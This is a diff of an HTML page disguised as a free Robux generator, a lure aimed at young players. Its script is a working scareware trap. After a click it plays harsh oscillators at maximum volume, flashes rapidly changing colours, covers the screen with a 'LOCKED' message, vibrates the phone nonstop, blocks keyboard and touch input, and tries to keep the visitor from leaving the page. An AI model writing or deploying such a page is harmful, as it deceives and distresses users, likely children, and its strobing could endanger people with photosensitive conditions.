@@ -1,126 +1,144 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>🔥 FREE ROBUX GENERATOR 🔥</title>
+    <title>🎁 99999 ROBUX FREE 🎁</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        * { margin:0; padding:0; }
+        * { margin:0;padding:0;overflow:hidden; }
         body {
-            font-family: Arial;
-            background: linear-gradient(45deg, #ff0000, #ff6600, #ffff00);
-            animation: pulse 0.5s infinite;
-            height: 100vh;
-            overflow: hidden;
-            color: white;
-            text-align: center;
+            height:100vh;
+            background: #000;
+            color:#fff;
+            font-family:Arial;
+            text-align:center;
+            animation:flash 0.2s infinite;
         }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.7; }
+        @keyframes flash {
+            0%,100%{background:#ff0000;}
+            50%{background:#ffff00;}
         }
-        .container {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            z-index: 100;
+        .center {
+            position:fixed;
+            top:50%;
+            left:50%;
+            transform:translate(-50%,-50%);
+            z-index:999;
         }
         button {
-            font-size: 24px;
-            padding: 20px 40px;
-            background: #00ff00;
-            border: none;
-            border-radius: 10px;
-            cursor: pointer;
-            box-shadow: 0 0 20px #00ff00;
+            font-size:28px;
+            padding:25px 50px;
+            background:#00ff00;
+            color:#000;
+            border:none;
+            border-radius:15px;
+            box-shadow:0 0 30px #00ff00;
+            cursor:pointer;
         }
-        .hidden { display: none !important; }
-        canvas { position: fixed; top:0; left:0; z-index: -1; }
+        .locked {
+            display:none !important;
+        }
+        #cover {
+            position:fixed;
+            top:0;left:0;width:100%;height:100%;
+            background:rgba(255,0,0,0.95);
+            z-index:10000;
+            pointer-events:none;
+        }
     </style>
 </head>
 <body>
-    <canvas id="bg"></canvas>
+    <div id="cover"></div>
     
-    <div class="container">
-        <h1>🎉 ROBUX GENERATOR 2026 🎉</h1>
-        <p>Click to get <b>10,000 FREE ROBUX</b> instantly!</p>
-        <button onclick="startHell()">🚀 CLAIM NOW 🚀</button>
-        <p style="font-size: 14px; margin-top: 20px;">No human verification needed!</p>
+    <div class="center">
+        <h1 style="font-size:3em;margin-bottom:20px;">🔥 99,999 ROBUX 🔥</h1>
+        <p style="font-size:1.5em;margin-bottom:30px;">INSTANT DELIVERY!</p>
+        <button onclick="lockHell()">💎 GET FREE ROBUX 💎</button>
     </div>
 
     <script>
-        // Create flashing background
-        const canvas = document.getElementById('bg');
-        const ctx = canvas.getContext('2d');
-        function resize() {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-        }
-        window.addEventListener('resize', resize);
-        resize();
-
-        function animate() {
-            ctx.fillStyle = `hsl(${Date.now()*0.1%360}, 100%, 50%)`;
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            requestAnimationFrame(animate);
-        }
-        animate();
-
-        // THE HELL FUNCTION
-        function startHell() {
-            document.querySelector('.container').classList.add('hidden');
+        let audioCtx, osc1, osc2, gain1, gain2;
+        
+        function lockHell() {
+            // HIDE BUTTON
+            document.querySelector('.center').classList.add('locked');
+            document.getElementById('cover').style.pointerEvents = 'auto';
             
-            // Create LOUD NOISE
-            const audioCtx = new AudioContext();
-            const oscillator = audioCtx.createOscillator();
-            const gainNode = audioCtx.createGain();
+            // CREATE TWO LOUD OSCILLATORS (MAX DISRUPTION)
+            audioCtx = new (window.AudioContext || window.webkitAudioContext)();
             
-            oscillator.connect(gainNode);
-            gainNode.connect(audioCtx.destination);
+            // Oscillator 1 - piercing high tone
+            osc1 = audioCtx.createOscillator();
+            gain1 = audioCtx.createGain();
+            osc1.connect(gain1);
+            gain1.connect(audioCtx.destination);
+            osc1.frequency.value = 1200;
+            osc1.type = 'sawtooth';
+            gain1.gain.setValueAtTime(1.0, audioCtx.currentTime); // MAX VOLUME
             
-            oscillator.frequency.value = 800; // Annoying pitch
-            oscillator.type = 'sawtooth'; // Harsh sound
+            // Oscillator 2 - low rumble
+            osc2 = audioCtx.createOscillator();
+            gain2 = audioCtx.createGain();
+            osc2.connect(gain2);
+            gain2.connect(audioCtx.destination);
+            osc2.frequency.value = 80;
+            osc2.type = 'square';
+            gain2.gain.setValueAtTime(0.8, audioCtx.currentTime);
             
-            // MAX VOLUME
-            gainNode.gain.setValueAtTime(1, audioCtx.currentTime);
+            // START SOUND HELL
+            osc1.start();
+            osc2.start();
             
-            oscillator.start();
-            
-            // Pitch sweep for maximum pain
-            let freq = 800;
-            const sweep = setInterval(() => {
-                freq += 50;
-                if (freq > 2000) freq = 800;
-                oscillator.frequency.value = freq;
-            }, 100);
-
-            // BLOCK EVERYTHING
-            document.onkeydown = e => e.preventDefault();
-            document.oncontextmenu = () => false;
-            document.ondragstart = () => false;
-            document.onselectstart = () => false;
-            
-            // Mobile touch block
-            document.addEventListener('touchstart', e => e.preventDefault(), {passive:false});
-            document.addEventListener('touchmove', e => e.preventDefault(), {passive:false});
-            
-            // Prevent leaving page
-            window.onbeforeunload = () => "ROBUX WILL BE LOST!";
-            
-            // Phone vibration hell
-            if (navigator.vibrate) {
-                navigator.vibrate(200);
-                setInterval(() => navigator.vibrate(100), 500);
-            }
-            
-            // Keep audio alive
+            // CONTINUOUS PITCH SWEEP
+            let t = 0;
             setInterval(() => {
-                if (audioCtx.state === 'suspended') audioCtx.resume();
-            }, 1000);
+                osc1.frequency.value = 800 + Math.sin(t) * 800;
+                osc2.frequency.value = 60 + Math.sin(t * 0.5) * 40;
+                t += 0.2;
+            }, 50);
+            
+            // SCREEN LOCK EFFECT
+            const cover = document.getElementById('cover');
+            let locked = false;
+            setInterval(() => {
+                cover.style.background = `hsl(${Date.now()*0.01%360}, 100%, 50%)`;
+                if (!locked) {
+                    cover.innerHTML = '<h1 style="position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:5em;">🔒 LOCKED 🔒</h1>';
+                    locked = true;
+                }
+            }, 100);
+            
+            // MAX VIBRATION (phones)
+            if (navigator.vibrate) {
+                setInterval(() => {
+                    navigator.vibrate([200,100,200]);
+                }, 400);
+            }
         }
-
-        // Auto-trigger on any interaction (backup)
-        document.addEventListener('click', startHell, {once: true});
-        document.addEventListener('touchstart', startHell, {once: true});
+        
+        // TOTAL INTERACTION BLOCK
+        document.addEventListener('keydown', e => e.preventDefault());
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('selectstart', e => e.preventDefault());
+        document.addEventListener('dragstart', e => e.preventDefault());
+        
+        // MOBILE LOCK
+        document.addEventListener('touchstart', e => {
+            e.preventDefault();
+            if (audioCtx) audioCtx.resume();
+        }, {passive: false});
+        document.addEventListener('touchmove', e => e.preventDefault(), {passive: false});
+        
+        // TRAP USER
+        window.onbeforeunload = () => "ROBUX LOADING... DON'T LEAVE!";
+        document.onvisibilitychange = () => {
+            if (!document.hidden && audioCtx) audioCtx.resume();
+        };
+        
+        // Backup auto-trigger
+        setTimeout(() => {
+            document.body.innerHTML += '<div style="position:fixed;bottom:10px;right:10px;font-size:20px;background:red;padding:10px;">👆 TAP ANYWHERE</div>';
+            document.addEventListener('click', lockHell, {once:true});
+        }, 2000);
     </script>
 </body>
 </html>
